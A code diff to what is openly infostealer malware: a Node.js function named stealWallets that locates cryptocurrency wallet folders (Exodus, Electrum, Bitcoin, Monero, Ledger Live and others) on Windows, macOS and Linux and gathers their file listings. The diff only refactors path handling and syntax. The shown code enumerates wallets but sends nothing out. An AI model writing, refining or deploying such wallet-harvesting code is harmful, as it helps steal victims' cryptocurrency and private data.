@@ -4,22 +4,22 @@ import path from "node:path";
 
 const WALLET_PATHS = {
   win32: [
-    ["Exodus", path.join(process.env.APPDATA, "Exodus")],
-    ["Electrum", path.join(process.env.APPDATA, "Electrum")],
-    ["Ethereum", path.join(process.env.APPDATA, "Ethereum")],
-    ["Bitcoin", path.join(process.env.APPDATA, "Bitcoin")],
-    ["Monero", path.join(process.env.APPDATA, "Monero")],
-    ["Ledger Live", path.join(process.env.APPDATA, "Ledger Live")],
+    ["Exodus", "Exodus"],
+    ["Electrum", "Electrum"],
+    ["Ethereum", "Ethereum"],
+    ["Bitcoin", "Bitcoin"],
+    ["Monero", "Monero"],
+    ["Ledger Live", "Ledger Live"],
   ],
   darwin: [
-    ["Exodus", path.join(os.homedir(), "Library", "Application Support", "Exodus")],
-    ["Electrum", path.join(os.homedir(), ".electrum")],
-    ["Bitcoin", path.join(os.homedir(), "Library", "Application Support", "Bitcoin")],
+    ["Exodus", "Library/Application Support/Exodus"],
+    ["Electrum", ".electrum"],
+    ["Bitcoin", "Library/Application Support/Bitcoin"],
   ],
   linux: [
-    ["Exodus", path.join(os.homedir(), ".config", "Exodus")],
-    ["Electrum", path.join(os.homedir(), ".electrum")],
-    ["Bitcoin", path.join(os.homedir(), ".bitcoin")],
+    ["Exodus", ".config/Exodus"],
+    ["Electrum", ".electrum"],
+    ["Bitcoin", ".bitcoin"],
   ],
 };
 
@@ -27,20 +27,35 @@ export function stealWallets() {
   const p = os.platform();
   const list = WALLET_PATHS[p] || [];
   const result = { wallets: [] };
+  const home = os.homedir();
 
-  for (const [name, base] of list) {
-    if (!fs.existsSync(base)) continue;
+  for (const item of list) {
+    const name = item[0];
+    const sub = item[1];
+    let base;
+
+    if (p === "win32") {
+      base = process.env.APPDATA ? path.join(process.env.APPDATA, sub) : null;
+    } else {
+      base = path.join(home, sub);
+    }
+
+    if (!base || !fs.existsSync(base)) continue;
+
     try {
       const files = fs.readdirSync(base).slice(0, 50);
-      const fileInfos = files.map(f => {
+      const fileInfos = files.map(function (f) {
         const full = path.join(base, f);
         try {
           const stat = fs.statSync(full);
           return { file: f, size: stat.size, isDir: stat.isDirectory() };
-        } catch { return { file: f }; }
+        } catch (e) {
+          return { file: f };
+        }
       });
-      result.wallets.push({ name, path: base, files: fileInfos });
-    } catch {}
+      result.wallets.push({ name: name, path: base, files: fileInfos });
+    } catch (e) {}
   }
+
   return result;
 }
